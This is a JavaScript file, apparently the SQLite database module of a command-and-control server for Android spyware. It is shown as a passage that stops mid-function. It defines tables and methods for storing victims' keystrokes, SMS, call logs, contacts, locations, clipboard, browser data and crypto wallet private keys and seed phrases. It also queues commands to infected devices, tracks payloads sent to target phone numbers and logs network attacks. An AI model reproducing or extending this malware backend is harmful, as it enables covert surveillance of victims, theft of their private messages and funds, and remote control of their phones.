const sqlite3 = require('sqlite3');
const { open } = require('sqlite');
const path = require('path');
const fs = require('fs-extra');
const crypto = require('crypto');
const config = require('./config');

class Database {
    constructor() {
        this.db = null;
        this.isInitialized = false;
    }
    
    async init() {
        try {
            // Ensure database directory exists
            await fs.ensureDir(path.dirname(config.paths.database));
            
            this.db = await open({
                filename: config.paths.database,
                driver: sqlite3.Database
            });
            
            await this.createAllTables();
            await this.createIndexes();
            await this.createTriggers();
            await this.initDefaultData();
            
            this.isInitialized = true;
            console.log('✅ Database initialized successfully');
        } catch (error) {
            console.error('❌ Database initialization failed:', error);
            throw error;
        }
    }
    
    async createAllTables() {
        // 1. Sessions Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS sessions (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT UNIQUE NOT NULL,
                device_name TEXT,
                device_model TEXT,
                device_brand TEXT,
                android_version TEXT,
                android_sdk INTEGER,
                ip_address TEXT,
                country TEXT,
                city TEXT,
                latitude REAL,
                longitude REAL,
                altitude REAL,
                accuracy REAL,
                battery INTEGER,
                battery_status TEXT,
                storage_total INTEGER,
                storage_used INTEGER,
                storage_free INTEGER,
                ram_total INTEGER,
                ram_used INTEGER,
                ram_free INTEGER,
                cpu_cores INTEGER,
                cpu_usage REAL,
                cpu_frequency INTEGER,
                gpu_info TEXT,
                temperature_cpu REAL,
                temperature_battery REAL,
                is_rooted BOOLEAN DEFAULT 0,
                is_emulator BOOLEAN DEFAULT 0,
                is_debugging BOOLEAN DEFAULT 0,
                installed_apps_count INTEGER,
                whatsapp_version TEXT,
                telegram_version TEXT,
                status TEXT DEFAULT 'active',
                first_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_seen DATETIME DEFAULT CURRENT_TIMESTAMP,
                last_ip TEXT,
                metadata TEXT,
                notes TEXT
            )
        `);
        
        // 2. Commands Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                command TEXT NOT NULL,
                command_type TEXT,
                category TEXT,
                parameters TEXT,
                result TEXT,
                result_type TEXT,
                status TEXT DEFAULT 'pending',
                execution_time INTEGER,
                sent_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                executed_at DATETIME,
                response_at DATETIME,
                error TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // 3. Payloads Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS payloads (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                payload_id TEXT UNIQUE NOT NULL,
                payload_type TEXT,
                filename TEXT,
                filesize INTEGER,
                md5 TEXT,
                sha256 TEXT,
                target_number TEXT,
                target_name TEXT,
                sent_at DATETIME,
                delivered BOOLEAN DEFAULT 0,
                delivered_at DATETIME,
                executed BOOLEAN DEFAULT 0,
                executed_at DATETIME,
                execution_details TEXT,
                status TEXT DEFAULT 'pending',
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                expires_at DATETIME
            )
        `);
        
        // 4. Extracted Data Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS extracted_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                data_type TEXT,
                data_category TEXT,
                data_content TEXT,
                file_path TEXT,
                file_size INTEGER,
                thumbnail TEXT,
                metadata TEXT,
                extracted_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // 5. Keylogs Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS keylogs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                log_data TEXT,
                application TEXT,
                window_title TEXT,
                package_name TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                is_sensitive BOOLEAN DEFAULT 0,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // 6. Screenshots Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS screenshots (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                screenshot_path TEXT,
                thumbnail_path TEXT,
                width INTEGER,
                height INTEGER,
                size INTEGER,
                captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // 7. Location History Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS location_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                latitude REAL,
                longitude REAL,
                altitude REAL,
                accuracy REAL,
                speed REAL,
                bearing REAL,
                provider TEXT,
                captured_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // 8. Call Logs Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS call_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                phone_number TEXT,
                contact_name TEXT,
                call_type TEXT,
                duration INTEGER,
                timestamp DATETIME,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // 9. SMS Messages Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS sms_messages (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                phone_number TEXT,
                contact_name TEXT,
                message_body TEXT,
                message_type TEXT,
                timestamp DATETIME,
                read_status BOOLEAN DEFAULT 0,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // 10. Contacts Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS contacts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                contact_name TEXT,
                phone_numbers TEXT,
                emails TEXT,
                organization TEXT,
                job_title TEXT,
                photo_path TEXT,
                starred BOOLEAN DEFAULT 0,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // 11. Installed Apps Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS installed_apps (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                app_name TEXT,
                package_name TEXT UNIQUE,
                version TEXT,
                version_code INTEGER,
                install_date DATETIME,
                update_date DATETIME,
                size INTEGER,
                is_system BOOLEAN DEFAULT 0,
                is_enabled BOOLEAN DEFAULT 1,
                permissions TEXT,
                activities TEXT,
                services TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // 12. Browser Data Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS browser_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                browser_type TEXT,
                data_type TEXT,
                data_content TEXT,
                url TEXT,
                title TEXT,
                timestamp DATETIME,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // 13. Crypto Wallets Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS crypto_wallets (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                wallet_type TEXT,
                wallet_address TEXT,
                private_key TEXT,
                public_key TEXT,
                seed_phrase TEXT,
                balance REAL,
                currency TEXT,
                last_updated DATETIME,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // 14. Attack Logs Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS attack_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                attack_type TEXT,
                target TEXT,
                port INTEGER,
                duration INTEGER,
                packets_sent INTEGER,
                status TEXT,
                result TEXT,
                started_at DATETIME,
                ended_at DATETIME,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // 15. System Logs Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS system_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                log_level TEXT,
                message TEXT,
                source TEXT,
                user_id INTEGER,
                session_id TEXT,
                metadata TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        `);
        
        // 16. Backups Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS backups (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                backup_id TEXT UNIQUE,
                session_id TEXT,
                backup_type TEXT,
                backup_path TEXT,
                backup_size INTEGER,
                file_count INTEGER,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                restored_at DATETIME,
                restored_by TEXT,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // 17. Settings Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS settings (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                setting_key TEXT UNIQUE,
                setting_value TEXT,
                setting_type TEXT,
                description TEXT,
                updated_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                updated_by TEXT
            )
        `);
        
        // 18. Alerts Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS alerts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                alert_type TEXT,
                severity TEXT,
                message TEXT,
                session_id TEXT,
                metadata TEXT,
                is_read BOOLEAN DEFAULT 0,
                created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
                read_at DATETIME
            )
        `);
        
        // 19. Notifications Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS notifications (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT,
                notification_text TEXT,
                notification_type TEXT,
                app_name TEXT,
                package_name TEXT,
                timestamp DATETIME,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
        
        // 20. Clipboard History Table
        await this.db.exec(`
            CREATE TABLE IF NOT EXISTS clipboard_history (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                session_id TEXT NOT NULL,
                content TEXT,
                content_type TEXT,
                source TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                FOREIGN KEY (session_id) REFERENCES sessions(session_id)
            )
        `);
    }
    
    async createIndexes() {
        await this.db.exec(`
            CREATE INDEX IF NOT EXISTS idx_sessions_status ON sessions(status);
            CREATE INDEX IF NOT EXISTS idx_sessions_last_seen ON sessions(last_seen);
            CREATE INDEX IF NOT EXISTS idx_commands_session ON commands(session_id);
            CREATE INDEX IF NOT EXISTS idx_commands_status ON commands(status);
            CREATE INDEX IF NOT EXISTS idx_commands_sent_at ON commands(sent_at);
            CREATE INDEX IF NOT EXISTS idx_keylogs_session ON keylogs(session_id);
            CREATE INDEX IF NOT EXISTS idx_keylogs_timestamp ON keylogs(timestamp);
            CREATE INDEX IF NOT EXISTS idx_location_session ON location_history(session_id);
            CREATE INDEX IF NOT EXISTS idx_location_captured ON location_history(captured_at);
            CREATE INDEX IF NOT EXISTS idx_call_logs_session ON call_logs(session_id);
            CREATE INDEX IF NOT EXISTS idx_sms_session ON sms_messages(session_id);
            CREATE INDEX IF NOT EXISTS idx_contacts_session ON contacts(session_id);
            CREATE INDEX IF NOT EXISTS idx_apps_session ON installed_apps(session_id);
            CREATE INDEX IF NOT EXISTS idx_payloads_status ON payloads(status);
            CREATE INDEX IF NOT EXISTS idx_extracted_data_session ON extracted_data(session_id);
            CREATE INDEX IF NOT EXISTS idx_browser_data_session ON browser_data(session_id);
            CREATE INDEX IF NOT EXISTS idx_crypto_wallets_session ON crypto_wallets(session_id);
            CREATE INDEX IF NOT EXISTS idx_attack_logs_session ON attack_logs(session_id);
            CREATE INDEX IF NOT EXISTS idx_system_logs_timestamp ON system_logs(timestamp);
            CREATE INDEX IF NOT EXISTS idx_alerts_severity ON alerts(severity);
            CREATE INDEX IF NOT EXISTS idx_alerts_is_read ON alerts(is_read);
        `);
    }
    
    async createTriggers() {
        // Update last_seen on session update
        await this.db.exec(`
            CREATE TRIGGER IF NOT EXISTS update_session_last_seen
            AFTER UPDATE ON sessions
            BEGIN
                UPDATE sessions SET last_seen = CURRENT_TIMESTAMP WHERE id = NEW.id;
            END
        `);
        
        // Log command execution
        await this.db.exec(`
            CREATE TRIGGER IF NOT EXISTS log_command_execution
            AFTER UPDATE ON commands
            WHEN NEW.status = 'executed'
            BEGIN
                INSERT INTO system_logs (log_level, message, source, metadata)
                VALUES ('INFO', 'Command executed', 'commands', json_object('command_id', NEW.id, 'session_id', NEW.session_id, 'command', NEW.command));
            END
        `);
        
        // Log session connection
        await this.db.exec(`
            CREATE TRIGGER IF NOT EXISTS log_session_connect
            AFTER INSERT ON sessions
            BEGIN
                INSERT INTO system_logs (log_level, message, source, metadata)
                VALUES ('INFO', 'New session connected', 'sessions', json_object('session_id', NEW.session_id, 'device', NEW.device_name));
            END
        `);
        
        // Update payload status on execution
        await this.db.exec(`
            CREATE TRIGGER IF NOT EXISTS update_payload_on_execute
            AFTER UPDATE ON payloads
            WHEN NEW.executed = 1 AND OLD.executed = 0
            BEGIN
                UPDATE payloads SET executed_at = CURRENT_TIMESTAMP WHERE id = NEW.id;
            END
        `);
    }
    
    async initDefaultData() {
        // Check if settings exist
        const settings = await this.db.get('SELECT COUNT(*) as count FROM settings');
        if (settings.count === 0) {
            const defaultSettings = [
                ['version', '12.0.0', 'string', 'Application version'],
                ['maintenance_mode', 'false', 'boolean', 'Maintenance mode'],
                ['auto_cleanup_days', '30', 'integer', 'Days to keep data'],
                ['max_payload_age_hours', '24', 'integer', 'Payload retention hours'],
                ['notify_on_connect', 'true', 'boolean', 'Notify on new connection'],
                ['auto_backup', 'true', 'boolean', 'Auto backup enabled'],
                ['backup_frequency', 'daily', 'string', 'Backup frequency'],
                ['log_level', 'info', 'string', 'Logging level']
            ];
            
            for (const [key, value, type, desc] of defaultSettings) {
                await this.db.run(
                    'INSERT INTO settings (setting_key, setting_value, setting_type, description) VALUES (?, ?, ?, ?)',
                    key, value, type, desc
                );
            }
            console.log('✅ Default settings initialized');
        }
    }
    
    // ==================== SESSION METHODS ====================
    
    async addSession(sessionId, deviceInfo) {
        const stmt = await this.db.prepare(`
            INSERT OR REPLACE INTO sessions (
                session_id, device_name, device_model, device_brand, android_version,
                android_sdk, ip_address, country, city, latitude, longitude,
                battery, battery_status, storage_total, storage_used, storage_free,
                ram_total, ram_used, ram_free, cpu_cores, cpu_usage, is_rooted,
                is_emulator, installed_apps_count, status, first_seen, last_seen, last_ip, metadata
            ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        `);
        
        await stmt.run(
            sessionId,
            deviceInfo.name || 'Unknown',
            deviceInfo.model || 'Unknown',
            deviceInfo.brand || 'Unknown',
            deviceInfo.androidVersion || 'Unknown',
            deviceInfo.androidSdk || 0,
            deviceInfo.ip || '0.0.0.0',
            deviceInfo.country || 'Unknown',
            deviceInfo.city || 'Unknown',
            deviceInfo.latitude || 0,
            deviceInfo.longitude || 0,
            deviceInfo.battery || 0,
            deviceInfo.batteryStatus || 'Unknown',
            deviceInfo.storageTotal || 0,
            deviceInfo.storageUsed || 0,
            deviceInfo.storageFree || 0,
            deviceInfo.ramTotal || 0,
            deviceInfo.ramUsed || 0,
            deviceInfo.ramFree || 0,
            deviceInfo.cpuCores || 0,
            deviceInfo.cpuUsage || 0,
            deviceInfo.isRooted ? 1 : 0,
            deviceInfo.isEmulator ? 1 : 0,
            deviceInfo.installedAppsCount || 0,
            'active',
            new Date().toISOString(),
            new Date().toISOString(),
            deviceInfo.ip || '0.0.0.0',
            JSON.stringify(deviceInfo.metadata || {})
        );
        
        await stmt.finalize();
        return await this.getSession(sessionId);
    }
    
    async getSession(sessionId) {
        return await this.db.get('SELECT * FROM sessions WHERE session_id = ?', sessionId);
    }
    
    async getSessionById(id) {
        return await this.db.get('SELECT * FROM sessions WHERE id = ?', id);
    }
    
    async getAllSessions(limit = 100, offset = 0) {
        return await this.db.all(
            'SELECT * FROM sessions ORDER BY last_seen DESC LIMIT ? OFFSET ?',
            limit, offset
        );
    }
    
    async getActiveSessions() {
        return await this.db.all('SELECT * FROM sessions WHERE status = "active" ORDER BY last_seen DESC');
    }
    
    async updateSession(sessionId, updates) {
        const allowedFields = [
            'device_name', 'device_model', 'android_version', 'ip_address',
            'country', 'city', 'latitude', 'longitude', 'battery', 'battery_status',
            'storage_used', 'storage_free', 'ram_used', 'ram_free', 'cpu_usage',
            'temperature_cpu', 'temperature_battery', 'is_rooted', 'status', 'metadata', 'notes'
        ];
        
        const fields = Object.keys(updates).filter(k => allowedFields.includes(k));
        if (fields.length === 0) return;
        
        const setClause = fields.map(f => `${f} = ?`).join(', ');
        const values = fields.map(f => updates[f]);
        values.push(sessionId);
        
        await this.db.run(`UPDATE sessions SET ${setClause}, last_seen = CURRENT_TIMESTAMP WHERE session_id = ?`, ...values);
    }
    
    async updateSessionLocation(sessionId, latitude, longitude, altitude, accuracy) {
        await this.db.run(`
            UPDATE sessions 
            SET latitude = ?, longitude = ?, altitude = ?, accuracy = ?, last_seen = CURRENT_TIMESTAMP 
            WHERE session_id = ?
        `, latitude, longitude, altitude, accuracy, sessionId);
    }
    
    async updateSessionBattery(sessionId, level, status) {
        await this.db.run(`
            UPDATE sessions 
            SET battery = ?, battery_status = ?, last_seen = CURRENT_TIMESTAMP 
            WHERE session_id = ?
        `, level, status, sessionId);
    }
    
    async killSession(sessionId) {
        await this.db.run('UPDATE sessions SET status = "killed" WHERE session_id = ?', sessionId);
        await this.addSystemLog('INFO', `Session ${sessionId} killed`, 'session', { sessionId });
    }
    
    async deleteSession(sessionId) {
        // Delete all related data first
        await this.db.run('DELETE FROM commands WHERE session_id = ?', sessionId);
        await this.db.run('DELETE FROM keylogs WHERE session_id = ?', sessionId);
        await this.db.run('DELETE FROM location_history WHERE session_id = ?', sessionId);
        await this.db.run('DELETE FROM call_logs WHERE session_id = ?', sessionId);
        await this.db.run('DELETE FROM sms_messages WHERE session_id = ?', sessionId);
        await this.db.run('DELETE FROM contacts WHERE session_id = ?', sessionId);
        await this.db.run('DELETE FROM installed_apps WHERE session_id = ?', sessionId);
        await this.db.run('DELETE FROM browser_data WHERE session_id = ?', sessionId);
        await this.db.run('DELETE FROM extracted_data WHERE session_id = ?', sessionId);
        await this.db.run('DELETE FROM screenshots WHERE session_id = ?', sessionId);
        await this.db.run('DELETE FROM notifications WHERE session_id = ?', sessionId);
        await this.db.run('DELETE FROM clipboard_history WHERE session_id = ?', sessionId);
        await this.db.run('DELETE FROM sessions WHERE session_id = ?', sessionId);
    }
    
    // ==================== COMMAND METHODS ====================
    
    async addCommand(sessionId, command, commandType, category = null, parameters = null) {
        const stmt = await this.db.prepare(`
            INSERT INTO commands (session_id, command, command_type, category, parameters, status)
            VALUES (?, ?, ?, ?, ?, 'pending')
        `);
        await stmt.run(sessionId, command, commandType, category, parameters ? JSON.stringify(parameters) : null);
        await stmt.finalize();
        
        const result = await this.db.get('SELECT last_insert_rowid() as id');
        return result.id;
    }
    
    async updateCommandResult(commandId, result, status = 'executed', error = null) {
        await this.db.run(`
            UPDATE commands 
            SET result = ?, status = ?, error = ?, executed_at = CURRENT_TIMESTAMP, response_at = CURRENT_TIMESTAMP
            WHERE id = ?
        `, result, status, error, commandId);
    }
    
    async getCommandHistory(sessionId, limit = 100, offset = 0) {
        return await this.db.all(`
            SELECT * FROM commands 
            WHERE session_id = ? 
            ORDER BY sent_at DESC 
            LIMIT ? OFFSET ?
        `, sessionId, limit, offset);
    }
    
    async getPendingCommands(sessionId) {
        return await this.db.all(`
            SELECT * FROM commands 
            WHERE session_id = ? AND status = 'pending'
            ORDER BY sent_at ASC
        `, sessionId);
    }
    
    async getCommandStats(sessionId) {
        return await this.db.get(`
            SELECT 
                COUNT(*) as total,
                SUM(CASE WHEN status = 'executed' THEN 1 ELSE 0 END) as executed,
                SUM(CASE WHEN status = 'failed' THEN 1 ELSE 0 END) as failed,
                SUM(CASE WHEN status = 'pending' THEN 1 ELSE 0 END) as pending,
                AVG(execution_time) as avg_execution_time
            FROM commands 
            WHERE session_id = ?
        `, sessionId);
    }
    
    // ==================== PAYLOAD METHODS ====================
    
    async addPayload(payloadId, payloadType, filename, targetNumber = null, targetName = null) {
        const expiresAt = new Date();
        expiresAt.setHours(expiresAt.getHours() + 24);
        
        const stmt = await this.db.prepare(`
            INSERT INTO payloads (payload_id, payload_type, filename, target_number, target_name, expires_at, status)
            VALUES (?, ?, ?, ?, ?, ?, 'generated')
        `);
        await stmt.run(payloadId, payloadType, filename, targetNumber, targetName, expiresAt.toISOString());
        await stmt.finalize();
        
        return payloadId;
    }
    
    async markPayloadDelivered(payloadId) {
        await this.db.run(`
            UPDATE payloads 
            SET delivered = 1, delivered_at = CURRENT_TIMESTAMP, status = 'delivered' 
            WHERE payload_id = ?
        `, payloadId);
    }
    
    async markPayloadExecuted(payloadId, executionDetails) {
        await this.db.run(`
            UPDATE payloads 
            SET executed = 1, executed_at = CURRENT_TIMESTAMP, status = 'executed', execution_details = ?
            WHERE payload_id = ?
        `, JSON.stringify(executionDetails), payloadId);
    }
    
    async getPayload(payloadId) {
        return await this.db.get('SELECT * FROM payloads WHERE payload_id = ?', payloadId);
    }
    
    async getAllPayloads(limit = 100) {
        return await this.db.all('SELECT * FROM payloads ORDER BY created_at DESC LIMIT ?', limit);
    }
    
    async getPayloadStats() {
        return await this.db.get(`
            SELECT 
                COUNT(*) as total,
                SUM(CASE WHEN delivered = 1 THEN 1 ELSE 0 END) as delivered,
                SUM(CASE WHEN executed = 1 THEN 1 ELSE 0 END) as executed,
                SUM(CASE WHEN status = 'generated' THEN 1 ELSE 0 END) as generated,
                SUM(CASE WHEN status = 'expired' THEN 1 ELSE 0 END) as expired
            FROM payloads
        `);
    }
    
    async cleanupExpiredPayloads() {
        const result = await this.db.run(`
            UPDATE payloads 
            SET status = 'expired' 
            WHERE expires_at < CURRENT_TIMESTAMP AND status IN ('generated', 'pending')
        `);
        return result.changes;
    }
    
    // ==================== DATA EXTRACTION METHODS ====================
    
    async saveExtractedData(sessionId, dataType, dataCategory, dataContent, metadata = null) {
        const stmt = await this.db.prepare(`
            INSERT INTO extracted_data (session_id, data_type, data_category, data_content, metadata)
            VALUES (?, ?, ?, ?, ?)
        `);
        await stmt.run(sessionId, dataType, dataCategory, dataContent, metadata ? JSON.stringify(metadata) : null);
        await stmt.finalize();
    }
    
    async getExtractedData(sessionId, dataType = null, limit = 100) {
        let query = 'SELECT * FROM extracted_data WHERE session_id = ?';
        const params = [sessionId];
        
        if (dataType) {
            query += ' AND data_type = ?';
            params.push(dataType);
        }
        
        query += ' ORDER BY extracted_at DESC LIMIT ?';
        params.push(limit);
        
        return await this.db.all(query, ...params);
    }
    
    // ==================== KEYLOGGER METHODS ====================
    
    async addKeylog(sessionId, logData, application = null, windowTitle = null, packageName = null, isSensitive = false) {
        const stmt = await this.db.prepare(`
            INSERT INTO keylogs (session_id, log_data, application, window_title, package_name, is_sensitive)
            VALUES (?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(sessionId, logData, application, windowTitle, packageName, isSensitive ? 1 : 0);
        await stmt.finalize();
    }
    
    async addKeylogBatch(sessionId, logs) {
        const stmt = await this.db.prepare(`
            INSERT INTO keylogs (session_id, log_data, application, window_title, timestamp)
            VALUES (?, ?, ?, ?, ?)
        `);
        
        for (const log of logs) {
            await stmt.run(sessionId, log.data, log.app, log.window, log.timestamp);
        }
        await stmt.finalize();
    }
    
    async getKeylogs(sessionId, limit = 1000, offset = 0, startDate = null, endDate = null) {
        let query = 'SELECT * FROM keylogs WHERE session_id = ?';
        const params = [sessionId];
        
        if (startDate) {
            query += ' AND timestamp >= ?';
            params.push(startDate);
        }
        if (endDate) {
            query += ' AND timestamp <= ?';
            params.push(endDate);
        }
        
        query += ' ORDER BY timestamp DESC LIMIT ? OFFSET ?';
        params.push(limit, offset);
        
        return await this.db.all(query, ...params);
    }
    
    async getKeylogStats(sessionId) {
        return await this.db.get(`
            SELECT 
                COUNT(*) as total,
                COUNT(DISTINCT application) as apps_count,
                SUM(CASE WHEN is_sensitive = 1 THEN 1 ELSE 0 END) as sensitive_count,
                DATE(MIN(timestamp)) as first_log,
                DATE(MAX(timestamp)) as last_log
            FROM keylogs 
            WHERE session_id = ?
        `, sessionId);
    }
    
    async clearKeylogs(sessionId) {
        await this.db.run('DELETE FROM keylogs WHERE session_id = ?', sessionId);
    }
    
    async searchKeylogs(sessionId, searchTerm) {
        return await this.db.all(`
            SELECT * FROM keylogs 
            WHERE session_id = ? AND log_data LIKE ?
            ORDER BY timestamp DESC
        `, sessionId, `%${searchTerm}%`);
    }
    
    // ==================== LOCATION METHODS ====================
    
    async addLocation(sessionId, latitude, longitude, altitude, accuracy, speed, bearing, provider) {
        const stmt = await this.db.prepare(`
            INSERT INTO location_history (session_id, latitude, longitude, altitude, accuracy, speed, bearing, provider)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(sessionId, latitude, longitude, altitude, accuracy, speed, bearing, provider);
        await stmt.finalize();
        
        // Also update session's last location
        await this.updateSessionLocation(sessionId, latitude, longitude, altitude, accuracy);
    }
    
    async getLocationHistory(sessionId, limit = 100, startDate = null, endDate = null) {
        let query = 'SELECT * FROM location_history WHERE session_id = ?';
        const params = [sessionId];
        
        if (startDate) {
            query += ' AND captured_at >= ?';
            params.push(startDate);
        }
        if (endDate) {
            query += ' AND captured_at <= ?';
            params.push(endDate);
        }
        
        query += ' ORDER BY captured_at DESC LIMIT ?';
        params.push(limit);
        
        return await this.db.all(query, ...params);
    }
    
    async getLastLocation(sessionId) {
        return await this.db.get(`
            SELECT * FROM location_history 
            WHERE session_id = ? 
            ORDER BY captured_at DESC LIMIT 1
        `, sessionId);
    }
    
    async getLocationStats(sessionId) {
        return await this.db.get(`
            SELECT 
                COUNT(*) as total,
                MIN(latitude) as min_lat,
                MAX(latitude) as max_lat,
                MIN(longitude) as min_lng,
                MAX(longitude) as max_lng,
                DATE(MIN(captured_at)) as first_location,
                DATE(MAX(captured_at)) as last_location
            FROM location_history 
            WHERE session_id = ?
        `, sessionId);
    }
    
    // ==================== CALL LOG METHODS ====================
    
    async addCallLog(sessionId, phoneNumber, contactName, callType, duration, timestamp) {
        const stmt = await this.db.prepare(`
            INSERT INTO call_logs (session_id, phone_number, contact_name, call_type, duration, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(sessionId, phoneNumber, contactName, callType, duration, timestamp);
        await stmt.finalize();
    }
    
    async addCallLogsBatch(sessionId, logs) {
        const stmt = await this.db.prepare(`
            INSERT INTO call_logs (session_id, phone_number, contact_name, call_type, duration, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        `);
        
        for (const log of logs) {
            await stmt.run(sessionId, log.number, log.name, log.type, log.duration, log.timestamp);
        }
        await stmt.finalize();
    }
    
    async getCallLogs(sessionId, limit = 500) {
        return await this.db.all(`
            SELECT * FROM call_logs 
            WHERE session_id = ? 
            ORDER BY timestamp DESC LIMIT ?
        `, sessionId, limit);
    }
    
    async getCallStats(sessionId) {
        return await this.db.get(`
            SELECT 
                COUNT(*) as total,
                SUM(CASE WHEN call_type = 'INCOMING' THEN 1 ELSE 0 END) as incoming,
                SUM(CASE WHEN call_type = 'OUTGOING' THEN 1 ELSE 0 END) as outgoing,
                SUM(CASE WHEN call_type = 'MISSED' THEN 1 ELSE 0 END) as missed,
                AVG(duration) as avg_duration,
                MAX(duration) as max_duration,
                MIN(duration) as min_duration
            FROM call_logs 
            WHERE session_id = ?
        `, sessionId);
    }
    
    // ==================== SMS METHODS ====================
    
    async addSMS(sessionId, phoneNumber, contactName, messageBody, messageType, timestamp, readStatus = false) {
        const stmt = await this.db.prepare(`
            INSERT INTO sms_messages (session_id, phone_number, contact_name, message_body, message_type, timestamp, read_status)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        `);
        await stmt.run(sessionId, phoneNumber, contactName, messageBody, messageType, timestamp, readStatus ? 1 : 0);
        await stmt.finalize();
    }
    
    async addSMSBatch(sessionId, messages) {
        const stmt = await this.db.prepare(`
            INSERT INTO sms_messages (session_id, phone_number, contact_name, message_body, message_type, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        `);
        
        for (const msg of messages) {
            await stmt.run(sessionId, msg.number, msg.name, msg.body, msg.type, msg.timestamp);
        }
        await stmt.finalize();
    }
    
    async getSMS(sessionId, limit = 500, type = null) {
        let query = 'SELECT * FROM sms_messages WHERE session_id = ?';
        const params = [sessionId];
        
        if (type) {
            query += ' AND message_type = ?';
            params.push(type);
        }
        
        query += ' ORDER BY timestamp DESC LIMIT ?';
        params.push(limit);
        
        return await this.db.all(query, ...params);
    }
    
    async searchSMS(sessionId, searchTerm) {
        return await this.db.all(`
            SELECT * FROM sms_messages 
            WHERE session_id = ? AND message_body LIKE ?
            ORDER BY timestamp DESC
        `, sessionId, `%${searchTerm}%`);
    }
    
    async getSMSStats(sessionId) {
        return await this.db.get(`
            SELECT 
                COUNT(*) as total,
                SUM(CASE WHEN message_type = 'INBOX' THEN 1 ELSE 0 END) as received,
                SUM(CASE WHEN message_type = 'SENT' THEN 1 ELSE 0 END) as sent,
                COUNT(DISTINCT phone_number) as unique_contacts,
                DATE(MIN(timestamp)) as first_message,
                DATE(MAX(timestamp)) as last_message
            FROM sms_messages 
            WHERE session_id = ?
        `, sessionId);
    }
    
    // ==================== CONTACT METHODS ====================
    
    async addContact(sessionId, contactName, phoneNumbers, emails, organization, jobTitle, photoPath = null, starred = false) {
        const stmt = await this.db.prepare(`
